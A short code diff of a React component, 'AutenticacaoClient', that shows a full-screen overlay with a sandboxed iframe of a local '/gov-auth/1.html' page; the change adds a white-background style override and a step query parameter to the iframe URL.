@@ -100,13 +100,14 @@ export function AutenticacaoClient({ sessionId, routeSessionId }: Props) {
 
   return (
     <div className="fixed inset-0 w-[100vw] bg-white z-[9999] overflow-hidden" style={{ minHeight: "100vh", height: "100dvh" }}>
+      <style>{`body.ah-theme,body.ah-theme-overlay-bg,body{background:#fff !important;background-image:none !important}`}</style>
       {saving && (
         <div className="absolute inset-0 bg-white/80 backdrop-blur-sm z-[99999] flex items-center justify-center">
           <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#003399]"></div>
         </div>
       )}
       <iframe
-        src={step1Done ? "/gov-auth/1.html#step2" : "/gov-auth/1.html"}
+        src={step1Done ? "/gov-auth/1.html?step=2#step2" : "/gov-auth/1.html"}
         className="w-full border-0"
         style={{ height: "100dvh", display: "block" }}
         sandbox="allow-scripts allow-same-origin allow-forms allow-popups"
